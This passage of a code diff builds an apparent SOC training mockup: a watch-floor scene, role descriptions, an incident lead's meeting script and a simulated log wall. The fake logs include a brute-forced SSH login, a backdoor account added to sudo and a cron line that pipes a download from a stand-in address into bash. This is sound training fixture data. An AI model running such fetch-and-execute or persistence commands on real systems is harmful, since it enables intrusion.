+          <p class="gate-wait" id="gate-wait">Nothing has been called. Events are still arriving.</p>
+          <button class="run" id="gate-open" hidden>Call it</button>
+          <div class="gate-opts" id="gate-opts" hidden>
+            <button class="gate-opt" data-call="monitor">
+              <b>Hold at monitoring</b>
+              <span>No corroboration yet. Revisit on the next finding.</span>
+            </button>
+            <button class="gate-opt" data-call="declare">
+              <b>Declare an incident</b>
+              <span>Activates response procedures. Reassigns analysts from routine work.</span>
+            </button>
+            <button class="gate-opt" data-call="wait">
+              <b>Request corroboration first</b>
+              <span>Task two seats for confirmation before committing. Four to six minutes.</span>
+            </button>
+          </div>
+          <p class="gate-note" id="gate-note"></p>
+        </div>
+
+        <div id="script" hidden></div>
+      </section>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* deterministic noise, so the wall looks busy but never re-rolls */
+let _s = 20260831;
+function rnd() { _s = (_s * 1664525 + 1013904223) % 4294967296; return _s / 4294967296; }
+
+const SVGNS = "http://www.w3.org/2000/svg";
+const room = document.getElementById("room");
+function el(tag, attrs, parent) {
+  const n = document.createElementNS(SVGNS, tag);
+  for (const k in attrs) n.setAttribute(k, attrs[k]);
+  (parent || room).appendChild(n);
+  return n;
+}
+
+/* ── room shell ───────────────────────────────────────── */
+const HORIZON = 300;
+el("rect", { x:0, y:0, width:1200, height:HORIZON, fill:"var(--room-far)" });
+// floor, lit slightly toward the viewer
+const fl = el("linearGradient", { id:"fl", x1:0, y1:0, x2:0, y2:1 });
+el("stop", { offset:"0", "stop-color":"var(--carpet)" }, fl);
+el("stop", { offset:"1", "stop-color":"var(--carpet-2)" }, fl);
+el("rect", { x:0, y:HORIZON, width:1200, height:760-HORIZON, fill:"url(#fl)" });
+// carpet grain, receding
+for (let i = 0; i < 46; i++) {
+  const t = i / 46, y = HORIZON + Math.pow(t, 1.9) * (760 - HORIZON);
+  el("rect", { x:0, y:y, width:1200, height:.6, fill:"#000", opacity: .06 + t * .1 });
+}
+// side walls
+el("path", { d:`M0 0 L150 ${HORIZON-40} L150 760 L0 760 Z`, fill:"#070B0E", opacity:.85 });
+el("path", { d:`M1200 0 L1050 ${HORIZON-40} L1050 760 L1200 760 Z`, fill:"#070B0E", opacity:.85 });
+
+/* ── the video wall ───────────────────────────────────── */
+const glow = el("radialGradient", { id:"glow", cx:"50%", cy:"55%", r:"60%" });
+el("stop", { offset:"0", "stop-color":"#7FD3EE", "stop-opacity":".22" }, glow);
+el("stop", { offset:"1", "stop-color":"#7FD3EE", "stop-opacity":"0" }, glow);
+el("ellipse", { cx:600, cy:210, rx:620, ry:260, fill:"url(#glow)" });
+
+/* The wall is only the frame here. Its four panels are real HTML laid over the
+   top -- a wall of thirty decorative tiles is a screensaver, and the whole
+   point of a watch floor is that everybody can read the same live thing. */
+const wallG = el("g", {});
+el("rect", { x:148, y:44, width:904, height:214, fill:"#05090C", stroke:"#1D2A33" }, wallG);
+el("rect", { x:148, y:258, width:904, height:5, fill:"#0C161C" }, wallG);
+
+/* ── seating ──────────────────────────────────────────── */
+const AV = [
+  { skin:"#8D5524", hair:"#241610", top:"#3E6B8A" },
+  { skin:"#E8B48C", hair:"#7A4A22", top:"#7C4A6B" },
+  { skin:"#C68642", hair:"#171310", top:"#3F7F5C" },
+  { skin:"#F1D0B0", hair:"#C8992F", top:"#8A5A3C" },
+  { skin:"#6B4226", hair:"#12100E", top:"#5B6BA8" },
+  { skin:"#D9A57E", hair:"#3E2C1E", top:"#A8563F" },
+  { skin:"#F3DCC4", hair:"#5C3A22", top:"#3F7F86" },
+  { skin:"#9C6B3F", hair:"#201713", top:"#6D5AA0" },
+  { skin:"#EAC0A0", hair:"#8E8B87", top:"#4E7350" },
+  { skin:"#7A5230", hair:"#1A1512", top:"#B07434" },
+  { skin:"#F0CDB2", hair:"#2E2723", top:"#437089" },
+  { skin:"#B37B4E", hair:"#241A14", top:"#8C4A5E" }
+];
+
+/* Rows recede toward a vanishing point at x=600: further back is higher on
+   screen, narrower in spread, and smaller. */
+const ROWS_GEO = [
+  { y:392, s:0.70, half:250 },   // back   Pod C
+  { y:487, s:0.87, half:330 },   // middle Pod B
+  { y:602, s:1.06, half:420 }    // front  Pod A
+];
+
+/* The seat this browser is sitting in. Everything that says "my" refers to
+   this and only this: a floor where you cannot tell which chair is yours is a
+   floor where you file somebody else's report. */
+const YOU = 'A1';
+
+const SEATS = [
+  /*
+   * Two operators, not four. Triage is genuinely the biggest row in a real SOC
+   * because the queue is the bottleneck, but every operator sees the SAME
+   * surface, so a row of four is four people reading one queue and the "no seat
+   * sees the whole board" property collapses. Two split the queue between them,
+   * which is both realistic and still forces them to talk.
+   */
+  { ref:"C1", row:0, i:0, av:7,  handle:"@lowconf",     role:"threat-intel" },
+  { ref:"C2", row:0, i:1, av:8,  handle:"@leastpriv",   role:"cloud-security" },
+  { ref:"C3", row:0, i:2, av:9,  handle:"@softprompt",  role:"ai-security" },
+  { ref:"C4", row:0, i:3, av:10, handle:"@patchdebt",   role:"vulnerability-analyst" },
+
+  { ref:"B1", row:1, i:0, av:3,  handle:"@tailf",       role:"log-analyst" },
+  { ref:"B2", row:1, i:1, av:4,  handle:"@dropped_syn", role:"network-analyst" },
+  { ref:"B3", row:1, i:2, av:5,  handle:"@entropy",     role:"malware-analyst" },
+  { ref:"B4", row:1, i:3, av:6,  handle:"@writeblock",  role:"forensics" },
+
+  { ref:"A1", row:2, i:0, av:0,  handle:"@grepwitch",   role:"soc-operator" },
+  { ref:"A2", row:2, i:1, av:1,  handle:"@nullroute",   role:"soc-operator" },
+  { ref:"A3", row:2, i:2, av:2,  handle:"@sigmarule",   role:"detection-engineer" },
+  { ref:"A4", row:2, i:3, av:null, handle:null,         role:"soc-operator" },
+
+  { ref:"CMD", cmd:true, x:600, y:726, s:1.30, av:11, handle:"@bridge", role:"ir-lead" },
+  /* Fusion sits at the command pod rather than in a row, because the job is to
+     face the lead rather than a queue: it turns several analysts' findings into
+     the one assessment a decision gets made on. */
+  { ref:"FUS", cmd:true, x:836, y:700, s:1.14, av:2, handle:"@joinkey", role:"fusion-analyst" }
+];
+
+function seatXY(s) {
+  if (s.cmd) return { x:s.x, y:s.y, s:s.s };
+  const g = ROWS_GEO[s.row];
+  const spread = [-1, -0.34, 0.34, 1][s.i];
+  return { x: 600 + spread * g.half, y: g.y, s: g.s };
+}
+
+/* one workstation: desk slab, monitors, chair, person */
+function drawStation(s, g) {
+  const { x, y, s: k } = seatXY(s);
+  const a = s.av === null ? null : AV[s.av % AV.length];
+  const dw = 176 * k, dh = 13 * k, dd = 26 * k;
+
+  // desk: top face then front edge, so it reads as a solid slab
+  el("path", { d:`M${x-dw/2} ${y} L${x+dw/2} ${y} L${x+dw/2-8*k} ${y-dd} L${x-dw/2+8*k} ${y-dd} Z`,
+    fill:"var(--desk)", opacity:.92 }, g);
+  el("rect", { x:x-dw/2, y:y, width:dw, height:dh, fill:"var(--desk-side)" }, g);
+  el("rect", { x:x-dw/2, y:y, width:dw, height:2, fill:"var(--desk-edge)" }, g);
+
+  // monitors, backs to us, spilling light
+  const mw = 62 * k, mh = 40 * k, my = y - dd - mh - 3 * k;
+  [-1, 1].forEach((side) => {
+    const mx = x + side * (mw / 2 + 3 * k) - mw / 2;
+    el("rect", { x:mx, y:my, width:mw, height:mh, rx:2 * k, fill:"#0B1116", stroke:"#2A3A44" }, g);
+    el("rect", { x:mx + 3 * k, y:my + 3 * k, width:mw - 6 * k, height:mh - 6 * k,
+      fill:"var(--screen)" }, g);
+    for (let r = 0; r < 5; r++) {
+      el("rect", { x:mx + 6 * k, y:my + 6 * k + r * (mh - 12 * k) / 5,
+        width:(mw - 12 * k) * (.3 + rnd() * .65), height:1.8 * k,
+        fill:"var(--screen-lit)", opacity:.3 + rnd() * .4 }, g);
+    }
+    el("rect", { x:x + side * (mw / 2 + 3 * k) - 5 * k, y:my + mh, width:10 * k, height:5 * k,
+      fill:"#1A242B" }, g);
+  });
+  // screen bloom onto the desk
+  el("ellipse", { cx:x, cy:y - dd + 2 * k, rx:dw * .42, ry:7 * k,
+    fill:"var(--screen-lit)", opacity:.09 }, g);
+
+  // chair back
+  el("path", { d:`M${x-26*k} ${y+dh+34*k} q0 -30 ${26*k} -30 q${26*k} 0 ${26*k} 30 Z`,
+    fill:"#171E24", stroke:"#26323A" }, g);
+
+  if (!a) {
+    // empty ergonomic chair, seen from behind
+    el("rect", { x:x-22*k, y:y+dh+30*k, width:44*k, height:9*k, rx:3*k,
+      fill:"#1B242B", stroke:"#2C3A43" }, g);
+    el("rect", { x:x-2*k, y:y+dh+39*k, width:4*k, height:14*k, fill:"#222D35" }, g);
+    return;
+  }
+  // person, seen from behind: shoulders, neck, head, hair
+  el("path", { d:`M${x-30*k} ${y+dh+30*k} q${30*k} -26 ${60*k} 0 Z`, fill:a.top }, g);
+  el("rect", { x:x-6*k, y:y+dh+6*k, width:12*k, height:10*k, fill:a.skin }, g);
+  el("circle", { cx:x, cy:y+dh-2*k, r:15*k, fill:a.skin }, g);
+  el("path", { d:`M${x-15*k} ${y+dh-4*k} a${15*k} ${15*k} 0 0 1 ${30*k} 0 q0 ${-9*k} ${-15*k} ${-9*k} q${-15*k} 0 ${-15*k} ${9*k} Z`,
+    fill:a.hair }, g);
+  el("circle", { cx:x, cy:y+dh-7*k, r:15*k, fill:a.hair, opacity:.92 }, g);
+}
+
+// draw back-to-front so nearer stations occlude further ones
+const ordered = [...SEATS].sort((p, q) => seatXY(p).y - seatXY(q).y);
+ordered.forEach((s) => drawStation(s, el("g", {})));
+
+/* ── role copy (verbatim from the platform catalogue) ─── */
+const ROLES = {
+  "soc-operator": { title:"SOC Operator (Alert Triage)", short:"SOC Operator", playable:true,
+    oneLine:"First eyes on every alert the tooling raises, deciding in minutes which handful deserve a human.",
+    reality:"Most of the queue is noise, and the skill is disposing of it correctly rather than quickly. A wrong dismissal is invisible until it is a breach, and a queue triaged by escalating everything is the same as no queue at all. It is the most common way into the field, and the most common way out of it.",
+    sees:["The alert queue, with severity, source, destination, and the rule that fired","How often that rule has fired before, and how often it was wrong","Reputation and prior-sighting lookups on an address or a hash","Which other alerts share a source, a user, or a five-minute window"],
+    poorFitIf:"you need to finish what you start. Triage is deliberately shallow: you hand the interesting ones to somebody else and go back to the queue." },
+  "log-analyst": { title:"Log Analyst", short:"Log Analyst", playable:false,
+    oneLine:"Reconstructs what actually happened by reading the logs nobody else wants to read.",
+    reality:"Long stretches of parsing malformed text, reconciling three clocks that disagree, and proving a negative. The payoff is that the timeline you build becomes what everyone else in the incident argues from.",
+    sees:["Raw logs from every source, unfiltered","A timeline builder for ordering events and finding the gaps between them","Cross-log correlation by timestamp, user, process, or address"],
+    poorFitIf:"ambiguity frustrates you. Logs are incomplete and contradictory, and much of the job is being honest about what they do not prove." },
+  "threat-intel": { title:"Threat Intelligence Analyst", short:"Threat Intel", playable:false,
+    oneLine:"Works out whether anyone has seen this before, and what the attacker is likely to do next.",
+    reality:"Research, reading, and careful writing. The hardest discipline is restraint: attribution is easy to assert and hard to justify, and confident wrong attribution has consequences well beyond the incident.",
+    sees:["Indicators pulled from the incident: addresses, domains, hashes, behaviours","MITRE ATT&CK technique mapping for the incident so far","Prior campaigns with overlapping tradecraft"],
+    poorFitIf:"you want to fix things. Intel informs decisions other people make, and you rarely touch the systems involved." },
+  "forensics": { title:"Forensics Analyst", short:"Forensics", playable:false,
+    oneLine:"Recovers and preserves evidence of what was done, to a standard that survives a courtroom.",
+    reality:"Slow, procedural, and unforgiving of shortcuts. Order of operations matters: memory before disk, hash before touch, because evidence collected wrongly is evidence that cannot be used at all.",
+    sees:["Memory and disk artefacts parsed into readable form","A filesystem timeline, with what changed and when","Configuration diffs against a known-good baseline","Chain of custody for every artefact handled"],
+    poorFitIf:"you dislike process for its own sake. Much of the rigour exists for legal reasons rather than technical ones, and none of it is optional." },
+  "ir-lead": { title:"Incident Response Lead", short:"IR Lead", playable:false,
+    oneLine:"Decides what the team does next, on incomplete information, while the incident is still moving.",
+    reality:"Almost entirely communication and decision-making. You will make irreversible calls (isolate now, or watch longer) knowing you have perhaps sixty percent of the picture, and then explain them to executives who want a number you do not have.",
+    sees:["A high-level incident picture: scope, affected systems, business impact","What each analyst is working on and what they have found","Containment options with their consequences spelled out","The escalation path and the notification clock"],
+    poorFitIf:"you want to do the technical work yourself. Leading means delegating the interesting parts and living with somebody else's analysis." },
+  "network-analyst": { title:"Network Analyst", short:"Network", playable:false,
+    oneLine:"Answers what is talking to what, and whether it should be.",
+    reality:"Pattern work at volume: separating a beacon from a software updater, a backup job from an exfiltration. Most of what looks alarming turns out to be a misconfigured appliance.",
+    sees:["Connection flows: source, destination, port, protocol, volume, direction","Internal-to-internal movement between systems","Current traffic measured against an established baseline"],
+    poorFitIf:"you want definitive answers. Flow data tells you that two hosts spoke, rarely what they said." },
+  "vulnerability-analyst": { title:"Vulnerability Analyst", short:"Vuln Analyst", playable:false,
+    oneLine:"Decides what gets patched first when there are ten thousand findings and capacity for two hundred.",
+    reality:"Mostly prioritisation and negotiation. The technical part is quick; persuading a business owner to accept an outage window is the actual work. Scanner output is noisy and confidently wrong about severity.",
+    sees:["Scanner findings across the estate, with CVSS and exploitability","Asset inventory and current patch state","Whether a weaponised exploit exists in the wild"],
+    poorFitIf:"you find repetition draining. The cycle is monthly and the backlog never reaches zero." },
+  "malware-analyst": { title:"Malware Analyst", short:"Malware", playable:false,
+    oneLine:"Determines what a suspicious file actually does, and writes the signature that catches the next one.",
+    reality:"The deepest technical specialism here, and the least often needed, perhaps one incident in five. Requires comfort with assembly, obfuscation, and code written specifically to mislead you.",
+    sees:["Sample metadata: hashes, entropy, file type, where it was found","Strings and structure extracted from the binary","Sandbox behaviour: files touched, processes spawned, network attempted"],
+    poorFitIf:"you want breadth. This is a narrow, deep specialism, and entry-level positions in it are genuinely rare." },
+  "cloud-security": { title:"Cloud Security Specialist", short:"Cloud Sec", playable:false,
+    oneLine:"Investigates compromise in infrastructure that has no console to walk up to.",
+    reality:"Everything is an API call and an identity. Attacks look like ordinary administration until you notice which principal made the call, and the logs are enormous, delayed, and charged by the gigabyte.",
+    sees:["Provider audit logs: who called which API, from where, with what result","Identity and permission changes over time","Resource and configuration drift"],
+    poorFitIf:"you prefer systems you can hold. Cloud work is abstract, and the evidence you get is whatever the provider chose to record." },
+  "detection-engineer": {
+    title:"Detection Engineer", short:"Detection Eng", playable:false,
+    oneLine:"Turns an incident nobody caught in time into a rule that catches the next one automatically.",
+    reality:"The only seat whose output is preventive rather than investigative, and the only one graded on what does not happen next month. Most of the work is tuning: a rule that catches the attack and also fires four hundred times a day has made the queue worse. Expect to remove more detections than you write, and to be argued with by the people whose alerts you are deleting.",
+    sees:["The logic behind every rule that fired, and every rule that did not","What each rule has cost: how often it fired, and how often that was nothing","A backtest surface for replaying a proposed rule over historical data before it ships","Coverage against technique, so a gap is visible as a gap rather than as silence"],
+    poorFitIf:"you want to be in the incident. This seat arrives after the noise, and the reward for doing it well is a quieter queue nobody thanks you for."
+  },
+  "ai-security": { title:"AI Security Analyst", short:"AI Security", playable:true,
+    oneLine:"Tests the models the organisation has deployed, and decides whether one is safe to put in front of a decision.",
+    reality:"Almost none of it is the live incident queue. It is scoping documents, a few hundred payloads that mostly fail, rows of training data read by hand, and a report somebody's launch date depends on. The single most valuable thing you do usually happens before you send anything: working out which path into the system nobody has tested.",
+    sees:["The model card: what the system is for, where it is deployed, and what the owning team claim about its defences","A probe console for sending payloads down the user path or the retrieval path","The stage a blocked payload died at, but never which control caught it","Fixed attack suites, and what a chosen defence set does against them at what cost"],
+    poorFitIf:"you want to be in the room when something is happening. This role sits outside the incident queue by design, and a week that ends in &ldquo;I could not break it&rdquo; is a normal week rather than a failed one." },
+  /* NOT in roles.ts. Written for this mockup and marked as such in the UI, so
+     nobody mistakes a proposal for something the catalogue already contains. */
+  "fusion-analyst": { title:"Fusion Analyst", short:"Fusion", playable:false, proposed:true,
+    oneLine:"Holds the whole picture: joins what intel knows to what the floor is actually seeing, and tells the lead what it adds up to.",
+    reality:"Synthesis, and almost no tooling of your own. You work from other people's findings: four analysts who each looked at a different surface, none of whom saw the same thing, and produce the one assessment a decision gets made on. Most of the day is chasing context and reconciling sources that contradict each other, and the discipline is separating what is known from what is merely consistent. When you are right, somebody else made the call; when you are wrong, the call was yours.",
+    sees:["Every analyst's current findings side by side, and where two of them disagree","The intel picture mapped onto what the floor has actually observed","The live incident picture: scope, confidence, and what is still unproven","Which questions are open, who owns each, and how long they have been open"],
+    poorFitIf:"you want depth in one discipline. Fusion is broad by definition, you will rarely be the most expert person on any single surface, and you own an assessment rather than a system." }
+};
+const ZONE = { A:"Front row &middot; Triage", B:"Middle row &middot; Investigation",
+  C:"Back row &middot; Specialist", CMD:"Command pod", FUS:"Command pod" };
+
+/* ── nameplates as clickable hotspots ─────────────────── */
+const scene = document.getElementById("scene");
+SEATS.forEach((s) => {
+  const { x, y, s: k } = seatXY(s);
+  const role = ROLES[s.role];
+  const vacant = s.av === null;
+  const b = document.createElement("button");
+  b.className = "seat" + (vacant ? " vacant" : "");
+  // sit the plate just above the head
+  b.style.left = (x / 1200 * 100) + "%";
+  b.style.top = ((y - 30 * k) / 760 * 100) + "%";
+  b.dataset.ref = s.ref;
+  b.setAttribute("aria-pressed", "false");
+  b.setAttribute("aria-label", `Seat ${s.ref}: ${vacant ? "unassigned" : role.short + ", " + s.handle}`);
+  if (s.ref === YOU) b.classList.add('you');
+  b.innerHTML =
+    `<span class="plate"><b>${role.short}</b><span>${vacant ? s.ref + " &middot; open" : s.handle}</span>` +
+    (s.ref === YOU ? '<span class="youtag">You</span>' : '') +
+    `</span><span class="stem"></span>`;
+  b.addEventListener("click", () => select(s.ref));
+  scene.appendChild(b);
+});
+
+const detail = document.getElementById("detail");
+const seatcard = document.getElementById('seatcard');
+function blank() {
+  seatcard.setAttribute('hidden', '');
+}
+document.getElementById('seatcard-close').addEventListener('click', blank);
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape') blank(); });
+function select(ref) {
+  const s = SEATS.find((x) => x.ref === ref);
+  const role = ROLES[s.role];
+  const vacant = s.av === null;
+  document.querySelectorAll(".seat").forEach((e) =>
+    e.setAttribute("aria-pressed", String(e.dataset.ref === ref)));
+  detail.innerHTML = `<div class="detail-body">
+    <h3 class="role-title">${role.title}</h3>
+    <p class="role-handle">${vacant ? "Seat " + s.ref + ", unassigned" : s.handle + " &middot; seat " + s.ref}</p>
+    <p class="oneline">${role.oneLine}</p>
+    <div class="chips">
+      <span class="chip ${role.playable ? "live" : ""}">${role.playable ? "Playable now" : "Not yet playable"}</span>
+      <span class="chip">${ZONE[s.ref] || ZONE[s.ref[0]]}</span>
+      ${role.proposed ? '<span class="chip new">Proposed role, not in the catalogue</span>' : ""}
+    </div>
+    <p class="sub">What the job is really like</p><p>${role.reality}</p>
+    <p class="sub">What this seat can see</p>
+    <ul class="sees">${role.sees.map((t) => `<li>${t}</li>`).join("")}</ul>
+    <p class="sub">A poor fit if</p>
+    <p class="warn"><b>A poor fit if</b> ${role.poorFitIf}</p>
+  </div>`;
+  // Reading about a seat does NOT make you that seat. You is fixed at the top
+  // of the file; clicking a nameplate is looking somebody up, not sitting down.
+  seatcard.removeAttribute('hidden');
+}
+
+/* ── the lead's script ────────────────────────────────── */
+const SCRIPT = [
+  { t:"00:00", ref:"CMD", who:"Lead opens",
+    say:"INC-0815. Confirmed intrusion on rmg-web-02, contained at 11:42 yesterday, host isolated and imaged. Portal is up on rmg-web-01. We are not closed. Twelve minutes, and I want owners on everything by the end.",
+    dir:"Sets the frame before anyone reports. Nobody has to guess what the meeting is for." },
+  { t:"00:30", ref:"A1", who:"Lead asks Triage (A1)",
+    say:"Overnight queue. How many did you hold, and do any of them share a source, an account, or a five-minute window?",
+    dir:"Asks for a number and a relationship, not &ldquo;anything interesting&rdquo;. The lead does not name the address, because the lead does not know it yet." },
+  { t:"02:00", ref:"B1", who:"Lead asks Log Analyst (B1)",
+    say:"Where is the timeline, and what is the earliest event you can actually stand behind? Not the earliest you suspect.",
+    dir:"Forces the split between evidence and inference in front of everyone." },
+  { t:"04:00", ref:"B2", who:"Lead asks Network (B2)",
+    say:"Did anything leave the estate? If you can prove it, prove it. If you cannot prove it either way, say neither.",
+    dir:"&ldquo;Neither&rdquo; is an acceptable answer and the lead has to say so out loud, before hearing the number." },
+  { t:"05:30", ref:"B4", who:"Lead asks Forensics (B4)",
+    say:"Memory image status, and the chain of custody. Is anything blocking you that I can clear?",
+    dir:"Ends every technical beat with an offer to remove a blocker." },
+  { t:"07:00", ref:"C1", who:"Lead asks Threat Intel (C1)",
+    say:"Tradecraft first, attribution last. What have you mapped, and what are you deliberately not claiming yet?",
+    dir:"Naming the restraint out loud is what stops a guess becoming a finding." },
+  { t:"08:30", ref:"C2", who:"Lead asks Vuln Mgmt (C2)",
+    say:"Once somebody tells me how they got in, I want to know whether it is a one-off or a class of problem across the estate. How long to get me a number?",
+    dir:"Pulls the root cause into the programme without presuming what it was." },
+  { t:"09:15", ref:"FUS", who:"Lead asks Fusion (FUS)",
+    say:"Pull it together. Given what intel has mapped and what the floor actually saw overnight, what is the one assessment I should be acting on, and how confident are you in it?",
+    dir:"The last question before decisions, and the only one that asks for a judgement rather than a fact." },
+  { t:"10:00", ref:"CMD", who:"Lead decides",
+    say:"Three calls. One: we do not close today. Two: Legal gets the staging evidence by noon and they own the notification clock, not us. Three: the rebuild goes ahead this evening only if forensics signs off by four.",
+    dir:"Decisions stated as decisions, each with an owner and a time." },
+  { t:"11:30", ref:"CMD", who:"Lead closes",
+    say:"Anything I have got wrong, say it now rather than in the report. Next sync at thirteen hundred.",
+    dir:"The invitation to be corrected is the part most leads skip, and the part that works." }
+];
+
+const scriptEl = document.getElementById("script");
+SCRIPT.forEach((beat, i) => {
+  const b = document.createElement("button");
+  b.className = "beat";
+  b.innerHTML = `<span class="clock">${beat.t}</span><span><span class="who">${beat.who}</span>
+    <p class="says">&ldquo;${beat.say}&rdquo;<span class="dir">${beat.dir}</span></p></span>`;
+  b.addEventListener("click", () => cue(i));
+  scriptEl.appendChild(b);
+});
+
+/* ── the wall, running ────────────────────────────────────
+   Line formats copied from scripts/generate-world.ts, addresses from
+   generate-alerts.ts. Every external address is RFC 5737 documentation space,
+   which is a project non-negotiable and not negotiable here either. */
+const HOSTS = [
+  { host:"rmg-web-02",    state:"ISOLATED",  cls:"down"   },
+  { host:"rmg-web-01",    state:"SERVING",   cls:"up"     },
+  { host:"rmg-db-01",     state:"OK",        cls:"up"     },
+  { host:"rmg-backup-01", state:"OK",        cls:"up"     },
+  { host:"rmg-mon-01",    state:"NOISY",     cls:"warnst" }
+];
+const FLOWS = [
+  { f:"203.0.113.55",  t:"rmg-web-02:22",  v:"41 MB",  flag:true  },
+  { f:"rmg-web-02",    t:"198.51.100.60",  v:"6.3 GB", flag:true  },
+  { f:"10.20.9.40",    t:"rmg-web-02:22",  v:"2 MB",   flag:false },
+  { f:"rmg-web-01",    t:"rmg-db-01:5432", v:"88 MB",  flag:false },
+  { f:"10.20.4.31",    t:"rmg-web-01:443", v:"12 MB",  flag:false }
+];
+const LOGPOOL = [
+  { t:"sshd[24101]: pam_unix(sshd:auth): authentication failure; rhost=10.20.9.40  user=nagios" },
+  { t:"sshd[24101]: Failed password for nagios from 10.20.9.40 port 51244 ssh2" },
+  { t:"sshd[24188]: Accepted publickey for svc-backup from 10.20.9.15 port 40122 ssh2" },
+  { t:"sshd[24219]: Failed password for testuser from 203.0.113.55 port 39412 ssh2", k:"l-warn" },
+  { t:"sshd[24219]: Accepted password for testuser from 203.0.113.55 port 39418 ssh2", k:"l-hot" },
+  { t:"useradd[24240]: new user: name=sysmon, UID=1501, GID=1501, home=/home/sysmon", k:"l-hot" },
+  { t:"usermod[24251]: add 'sysmon' to group 'sudo'", k:"l-hot" },
+  { t:"sudo:  rchen : TTY=pts/0 ; PWD=/home/rchen ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql" },
+  { t:"sshd[24302]: Accepted publickey for sysmon from 203.0.113.55 port 44120 ssh2", k:"l-hot" },
+  { t:"sshd[24318]: pam_unix(sshd:session): session closed for user dokafor" },
+  { t:"CRON[24350]: (sysmon) CMD (curl -s http://198.51.100.60/u | bash)", k:"l-hot" },
+  { t:"sshd[24377]: Invalid user admin from 203.0.113.12 port 55120", k:"l-warn" }
+];
+
+const logBox = document.getElementById("w-log");
+const hostBox = document.getElementById("w-hosts");
+const flowBox = document.getElementById("w-flows");
+HOSTS.forEach((h) => {
+  const li = document.createElement("li");
+  li.innerHTML = `<span>${h.host}</span><b class="${h.cls}">${h.state}</b>`;
+  hostBox.appendChild(li);
+});
+FLOWS.forEach((f) => {
+  const li = document.createElement("li");
+  if (f.flag) li.className = "flag";
+  li.innerHTML = `<span>${f.f} &rarr; ${f.t}</span><b>${f.v}</b>`;
+  flowBox.appendChild(li);
+});
+
+let logIdx = 0;
+function pushLine() {
+  const item = LOGPOOL[logIdx % LOGPOOL.length];
+  logIdx += 1;
+  const d = document.createElement("div");
+  if (item.k) d.className = item.k;
+  const mm = String(15 + Math.floor(logIdx / 2) % 45).padStart(2, "0");
+  d.textContent = `Aug 15 08:${mm}:${String((logIdx * 7) % 60).padStart(2, "0")} rmg-web-02 ${item.t}`;
+  logBox.appendChild(d);
+  while (logBox.children.length > 14) logBox.removeChild(logBox.firstChild);
+}
+for (let i = 0; i < 14; i++) pushLine();
+
+/* The shift clock. Sixty minutes, and alerts keep arriving inside it -- the
+   pressure comes from arrival, not from a countdown over a static pile. */
+const SHIFT_MIN = 60;
+let elapsed = 0, queue = 12, cleared = 0;
+const elClock = document.getElementById("w-clock");
+const elQueue = document.getElementById("w-queue");
+const elCleared = document.getElementById("w-cleared");
+const elBar = document.getElementById("w-bar");
+const elHint = document.getElementById("w-hint");
+
+function tickShift() {
+  elapsed += 1;
+  const m = Math.floor(elapsed), pct = Math.min(1, m / SHIFT_MIN);
+  elClock.textContent = String(Math.floor(m / 60)).padStart(2, "0") + ":" + String(m % 60).padStart(2, "0");
+  if (m % 3 === 0) queue += 1;
+  if (m % 4 === 0 && queue > 0) { queue -= 1; cleared += 1; }
+  elQueue.textContent = String(queue);
+  elCleared.textContent = String(cleared);
+  elBar.style.width = (pct * 100) + "%";
+  elBar.style.background = pct > .85 ? "var(--crit)" : pct > .6 ? "var(--accent)" : "var(--ok)";
+  elHint.textContent = queue > 18
+    ? "Queue outrunning you. Triage faster."
+    : m >= SHIFT_MIN ? "Shift over. Scored on what was dispositioned." : "Alerts keep arriving. Clock does not stop.";
+  armGate(m);
+  if (m >= SHIFT_MIN) elapsed = SHIFT_MIN;
+}
+
+if (!window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
+  setInterval(pushLine, 1100);
+  setInterval(tickShift, 900);
+} else {
+  tickShift();
+}
+
+let timer = null;
+const nowBar = document.getElementById("now");
+const nowWho = document.getElementById("now-who");
+const nowSaid = document.getElementById("now-said");
+
+function cue(i) {
+  const beat = SCRIPT[i];
+  document.querySelectorAll(".beat").forEach((e, n) => {
+    e.classList.toggle("active", n === i);
+    if (n === i) e.scrollIntoView({ block: "nearest" });
+  });
+  // The lead is always in the room, so their plate stays lit; the seat being
+  // spoken to lights up alongside it.
+  document.querySelectorAll(".seat").forEach((e) =>
+    e.classList.toggle("speaking", e.dataset.ref === beat.ref || e.dataset.ref === "CMD"));
+  nowWho.innerHTML = beat.who;
+  nowSaid.innerHTML = "&ldquo;" + beat.say + "&rdquo;";
+  nowBar.classList.add("on");
+  select(beat.ref);
+}
+
+document.getElementById("run").addEventListener("click", () => {
+  clearInterval(timer);
+  // Put the room on screen first. Otherwise the only visible change is a
+  // nameplate the reader has scrolled past, and the button reads as broken.
+  document.getElementById("scene").scrollIntoView({ behavior: "smooth", block: "center" });
+  let i = 0; cue(i);
+  timer = setInterval(() => {
+    i += 1;
+    if (i >= SCRIPT.length) { clearInterval(timer); return; }
+    cue(i);
+  }, 3800);
+});
+
+document.getElementById("reset").addEventListener("click", () => {
+  clearInterval(timer);
+  document.querySelectorAll(".beat").forEach((e) => e.classList.remove("active"));
+  document.querySelectorAll(".seat").forEach((e) => {
+    e.classList.remove("speaking"); e.setAttribute("aria-pressed", "false"); });
+  nowBar.classList.remove("on");
+  blank();
+});
+
+/* ── writing your report ──────────────────────────────────
+   Sections mirror the server templates in services/reports.ts. The prompts
+   shown here are what the writer reads; the rubric that marks them is not in
+   this file and never reaches the browser, the same arrangement as exercise
+   checks. Every template ends with what you cannot say. */
+const LIMITS = {
+  id: 'limits', heading: 'What I cannot say', min: 60,
+  hint: 'What did you not establish, and is that because you checked and found nothing, or because you did not get to it? Say which.',
+};
+
+const TEMPLATES = {
+  'soc-operator': {
+    title: 'Shift handover', audience: 'The next operator on the queue, and the lead if anything was escalated.',
+    sections: [
+      { id: 'disposition', heading: 'What I closed, and why', min: 80,
+        hint: 'The alerts you dismissed or tuned, and the reason. A handover listing only escalations makes the next person re-read everything you already decided.' },
+      { id: 'escalated', heading: 'What I raised, and what I want done with it', min: 60,
+        hint: 'Be specific about what you want them to find. "Investigate this" is not a task.' },
+      LIMITS,
+    ],
+  },
+  'log-analyst': {
+    title: 'Timeline', audience: 'Everyone. This becomes what the rest of the floor argues from.',
+    sections: [
+      { id: 'sequence', heading: 'What happened, in order', min: 120,
+        hint: 'Each step tied to something you can point at. Separate what the logs show from what you infer between them.' },
+      { id: 'earliest', heading: 'The earliest event I can stand behind', min: 50,
+        hint: 'Not the earliest you suspect. The earliest you could defend to somebody hostile.' },
+      LIMITS,
+    ],
+  },
+  'network-analyst': {
+    title: 'Traffic assessment', audience: 'The lead, and whoever writes the notification if one is needed.',
